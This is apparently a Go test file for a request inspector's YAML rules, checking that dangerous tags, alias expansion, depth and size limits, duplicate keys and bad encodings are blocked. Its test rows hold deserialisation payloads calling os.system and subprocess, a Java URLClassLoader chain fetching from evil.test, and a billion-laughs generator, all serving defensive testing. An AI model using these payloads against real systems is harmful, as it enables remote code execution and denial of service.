package formats

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

const (
	idYAMLSyntax = 5002500
	idYAMLTag    = 5002501
	idYAMLAnchor = 5002502
	idYAMLLimit  = 5002503
	idYAMLMulti  = 5002504
	idYAMLDup    = 5002505
	yamlType     = "application/yaml"
)

func allowYAML(p *Policy) {
	p.AllowedTypes = append(defaultAllowedTypes(), "application/yaml", "text/yaml", "application/x-yaml")
}

// laughs is the billion laughs document with n levels of ten references each.
func laughs(n int) string {
	var sb strings.Builder
	sb.WriteString("a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n")
	prev := "a"
	for i := 1; i < n; i++ {
		name := string(rune('a' + i))
		fmt.Fprintf(&sb, "%s: &%s [%s]\n", name, name, strings.TrimSuffix(strings.Repeat("*"+prev+",", 9), ","))
		prev = name
	}
	return sb.String()
}

func deepBlock(n int) string {
	var sb strings.Builder
	for i := 0; i < n; i++ {
		sb.WriteString(strings.Repeat(" ", i) + "k:\n")
	}
	sb.WriteString(strings.Repeat(" ", n) + "v\n")
	return sb.String()
}

var yamlRows = register("yaml", []row{
	// Not accepted unless the policy says so.
	{name: "refused by default", ct: yamlType, body: "a: 1\n", want: 5002001, tweak: func(p *Policy) { p.AllowedTypes = nil }},
	{name: "refused by default: text/yaml", ct: "text/yaml", body: "a: 1\n", want: 5002001},
	{name: "refused by default: x-yaml", ct: "application/x-yaml", body: "a: 1\n", want: 5002001},
	{name: "refused by default: +yaml", ct: "application/vnd.x+yaml", body: "a: 1\n", want: 5002001},

	// Accepted when allowed.
	{name: "mapping", ct: yamlType, body: "name: alice\nage: 30\n", tweak: allowYAML},
	{name: "nested and sequences", ct: yamlType, body: "user:\n  name: alice\n  roles:\n    - admin\n    - dev\n  address:\n    city: Cairns\n", tweak: allowYAML},
	{name: "flow style", ct: yamlType, body: "{a: 1, b: [1, 2, 3], c: {d: e}}\n", tweak: allowYAML},
	{name: "quoted strings and scalars", ct: "text/yaml", body: "a: \"quoted: text\"\nb: 'single'\nc: true\nd: null\ne: 3.14\nf: 0x1F\n", tweak: allowYAML},
	{name: "block scalars", ct: yamlType, body: "text: |\n  line one\n  line two\nfolded: >\n  folded\n  text\n", tweak: allowYAML},
	{name: "comments", ct: yamlType, body: "# header\na: 1 # trailing\n# footer\n", tweak: allowYAML},
	{name: "a document marker at the start", ct: yamlType, body: "---\na: 1\n", tweak: allowYAML},
	{name: "one anchor and its aliases", ct: yamlType, body: "base: &b\n  x: 1\nitem:\n  <<: *b\n  y: 2\nother: *b\n", tweak: allowYAML},
	{name: "a sequence at the root", ct: yamlType, body: "- a\n- b\n- c\n", tweak: allowYAML},
	{name: "depth at the limit", ct: yamlType, body: deepBlock(30), tweak: allowYAML},
	{name: "the same key in different mappings", ct: yamlType, body: "a:\n  k: 1\nb:\n  k: 2\n", tweak: allowYAML},
	{name: "a version directive", ct: yamlType, body: "%YAML 1.2\n---\na: 1\n", tweak: allowYAML},

	// Tags: deserialisation attacks.
	{name: "python object", ct: yamlType, body: "a: !!python/object/apply:os.system [\"id\"]\n", want: idYAMLTag, tweak: allowYAML},
	{name: "python object at the root", ct: yamlType, body: "!!python/object/apply:subprocess.check_output [[\"id\"]]\n", want: idYAMLTag, tweak: allowYAML},
	{name: "ruby object", ct: yamlType, body: "--- !ruby/object:Gem::Installer\ni: x\n", want: idYAMLTag, tweak: allowYAML},
	{name: "java class by uri", ct: yamlType, body: "a: !<tag:yaml.org,2002:javax.script.ScriptEngineManager> [!<tag:yaml.org,2002:java.net.URLClassLoader> [[!<tag:yaml.org,2002:java.net.URL> [\"http://evil.test/\"]]]]\n", want: idYAMLTag, tweak: allowYAML},
	{name: "a tag on a string", ct: yamlType, body: "a: !!str 123\n", want: idYAMLTag, tweak: allowYAML},
	{name: "a binary tag", ct: yamlType, body: "a: !!binary aGVsbG8=\n", want: idYAMLTag, tweak: allowYAML},
	{name: "a local tag", ct: yamlType, body: "a: !custom value\n", want: idYAMLTag, tweak: allowYAML},
	{name: "a tag on a mapping", ct: yamlType, body: "a: !!map\n  b: 1\n", want: idYAMLTag, tweak: allowYAML},
	{name: "a tag directive", ct: yamlType, body: "%TAG !e! tag:evil.test,2000:\n---\na: !e!thing x\n", want: idYAMLTag, tweak: allowYAML},
	{name: "a tag directive that no tag uses", ct: yamlType, body: "%TAG !e! tag:evil.test,2000:\n---\na: 1\n", want: idYAMLTag, tweak: allowYAML},
	{name: "a tag in a sequence", ct: yamlType, body: "- !!python/name:os.system\n", want: idYAMLTag, tweak: allowYAML},

	// Anchors and aliases: expansion.
	{name: "billion laughs", ct: yamlType, body: laughs(9), want: idYAMLAnchor, tweak: allowYAML},
	{name: "five anchors", ct: yamlType, body: "a: &a 1\nb: &b 2\nc: &c 3\nd: &d 4\ne: &e 5\n", want: idYAMLAnchor, tweak: allowYAML},
	{name: "nine aliases of one anchor", ct: yamlType, body: "a: &a x\nb: [*a, *a, *a, *a, *a, *a, *a, *a, *a]\n", want: idYAMLAnchor, tweak: allowYAML},
	{name: "anchors raised by the policy", ct: yamlType, body: "a: &a 1\nb: &b 2\nc: &c 3\nd: &d 4\ne: &e 5\n",
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxAnchors = 10 }},

	// Limits.
	{name: "mapping at the node limit", ct: yamlType, body: "a: 1\nb: 2\n",
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxNodes = 5 }},
	{name: "mapping pairs exceed the node limit before parsing", ct: yamlType, body: "a: 1\nb: 2\nc: 3\nd: 4\ne: 5\nf: 6\n", want: idYAMLLimit,
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxNodes = 10 }},
	{name: "depth in a block", ct: yamlType, body: deepBlock(40), want: idYAMLLimit, tweak: allowYAML},
	{name: "depth in flow style", ct: yamlType, body: "a: " + strings.Repeat("[", 100) + strings.Repeat("]", 100) + "\n", want: idYAMLLimit, tweak: allowYAML},
	{name: "a very deep flow document", ct: yamlType, body: strings.Repeat("[", 30000), want: idYAMLLimit, tweak: allowYAML},
	{name: "depth in flow mappings", ct: yamlType, body: strings.Repeat("{a: ", 40) + "1" + strings.Repeat("}", 40), want: idYAMLLimit, tweak: allowYAML},
	{name: "too many nodes", ct: yamlType, body: "[" + strings.Repeat("1, ", 20) + "1]\n", want: idYAMLLimit,
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxNodes = 10 }},
	{name: "more nodes than the limit with fewer tokens than four to a node", ct: yamlType, body: strings.Repeat("- a\n", 15), want: idYAMLLimit,
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxNodes = 10 }},
	{name: "four mappings deep when three is the limit", ct: yamlType, body: "a:\n b:\n  c:\n   d: 1\n", want: idYAMLLimit,
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxDepth = 3 }},
	{name: "four sequences deep when three is the limit", ct: yamlType, body: "- - - - a\n", want: idYAMLLimit,
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxDepth = 3 }},
	{name: "too large", ct: yamlType, body: "a: " + strings.Repeat("x", 100) + "\n", want: idYAMLLimit,
		tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxBytes = 50 }},

	// Structure.
	{name: "two documents", ct: yamlType, body: "a: 1\n---\nb: 2\n", want: idYAMLMulti, tweak: allowYAML},
	{name: "three documents", ct: yamlType, body: "---\na: 1\n---\nb: 2\n---\nc: 3\n", want: idYAMLMulti, tweak: allowYAML},
	{name: "a duplicate key", ct: yamlType, body: "a: 1\na: 2\n", want: idYAMLDup, tweak: allowYAML},
	{name: "a duplicate key in case", ct: yamlType, body: "admin: false\nAdmin: true\n", want: idYAMLDup, tweak: allowYAML},
	{name: "a duplicate key in a nested mapping", ct: yamlType, body: "x:\n  a: 1\n  b: 2\n  a: 3\n", want: idYAMLDup, tweak: allowYAML},
	{name: "a duplicate key in flow style", ct: yamlType, body: "{a: 1, b: 2, a: 3}\n", want: idYAMLDup, tweak: allowYAML},
	{name: "an unclosed flow sequence", ct: yamlType, body: "a: [1, 2\n", want: idYAMLSyntax, tweak: allowYAML},
	{name: "an unterminated quote", ct: yamlType, body: "a: \"abc\nb: 2\n", want: idYAMLSyntax, tweak: allowYAML},
	{name: "a mapping inside a plain scalar", ct: yamlType, body: "a: b: c\n", want: idYAMLSyntax, tweak: allowYAML},
	{name: "a NUL byte", ct: yamlType, body: "a: x\x00y\n", want: idControl, tweak: allowYAML},
	{name: "a bell", ct: yamlType, body: "a: x\x07y\n", want: idControl, tweak: allowYAML},
	{name: "a delete character", ct: yamlType, body: "a: x\x7fy\n", want: idControl, tweak: allowYAML},
	{name: "invalid utf-8", ct: yamlType, body: "a: \xff\n", want: idBadUTF8, tweak: allowYAML},
	{name: "a byte order mark", ct: yamlType, body: "\xef\xbb\xbfa: 1\n", want: idBOM, tweak: allowYAML},
	{name: "utf-16", ct: yamlType, body: "\xff\xfe" + utf16le("a: 1\n"), want: idWide, tweak: allowYAML},
})

func TestYAML(t *testing.T) {
	runTable(t, yamlRows)
	t.Run("mapping work budget", func(t *testing.T) {
		for _, mode := range []Action{Block, Monitor, Off} {
			p := Policy{AllowedTypes: []string{yamlType}, Rules: map[string]Action{"yaml-limit": mode, "yaml-duplicate-key": Off}}
			if mode == Monitor {
				p.Monitor = true
			}
			in := New(p)
			if in.Err() != nil {
				t.Fatal(in.Err())
			}
			for _, count := range []int{1023, 1024, 1025, 4999} {
				for _, kind := range []string{"duplicate", "unique", "explicit keys", "flow nulls", "block nulls"} {
					var sb strings.Builder
					for i := 0; i < count; i++ {
						if kind == "unique" {
							fmt.Fprintf(&sb, "k%d: 1\n", i)
						} else {
							sb.WriteString("a: 1\n")
						}
					}
					if kind == "explicit keys" {
						sb.Reset()
						sb.WriteString(strings.Repeat("? a\n", count))
					}
					if kind == "flow nulls" {
						sb.Reset()
						sb.WriteString("{" + strings.TrimSuffix(strings.Repeat("a,", count), ",") + "}\n")
					}
					if kind == "block nulls" {
						sb.Reset()
						sb.WriteString(strings.Repeat("-\n", count))
					}
					f := &finder{in: in}
					parsed := in.yamlTree(f, sb.String(), &in.pol.YAML)
					if parsed != (count <= 1024) {
						t.Fatalf("mode=%s pairs=%d kind=%s parsed=%t", mode, count, kind, parsed)
					}
					wantVerdicts := 0
					if count > 1024 && mode != Off {
						wantVerdicts = 1
					}
					if len(f.verdicts) != wantVerdicts {
						t.Fatalf("mode=%s pairs=%d verdicts=%v", mode, count, f.verdicts)
					}
					if wantVerdicts == 1 {
						v := f.verdicts[0]
						if v.ID != idYAMLLimit || v.Block != (mode == Block) || !strings.Contains(v.Message, "too much collection parser work (limit 1024)") {
							t.Fatalf("incorrect limit verdict: %+v", v)
						}
					}
				}
			}
		}
	})
}

func TestYAMLBillionLaughsIsRefusedWithoutExpanding(t *testing.T) {
	in := New(Policy{AllowedTypes: append(defaultAllowedTypes(), yamlType), YAML: YAMLLimits{MaxAnchors: 100, MaxAliases: 100}})
	// With the anchor limits raised the document is accepted: the parser builds a tree and never expands aliases, so it costs nothing.
	start := time.Now()
	res := in.Inspect(row{ct: yamlType, body: laughs(9)}.request())
	if took := time.Since(start); took > time.Second {
		t.Fatalf("took %v", took)
	}
	for _, v := range res.Verdicts {
		if v.Block {
			t.Fatalf("refused: %s", v.Message)
		}
	}
}

func FuzzYAML(f *testing.F) {
	for _, r := range yamlRows {
		f.Add(r.body)
	}
	in := New(Policy{AllowedTypes: append(defaultAllowedTypes(), yamlType)})
	f.Fuzz(func(t *testing.T, body string) {
		fuzzNoPanic(t, in, row{ct: yamlType, body: body})
	})
}

func BenchmarkYAML(b *testing.B) {
	var sb strings.Builder
	sb.WriteString("users:\n")
	for i := 0; sb.Len() < 12<<10; i++ {
		fmt.Fprintf(&sb, "  - id: %d\n    name: Alice Example\n    email: alice@example.test\n    tags: [a, b, c]\n    active: true\n", 1000+i)
	}
	benchRow(b, row{ct: yamlType, body: sb.String(), tweak: func(p *Policy) { allowYAML(p); p.YAML.MaxNodes = 1_000_000 }})
}
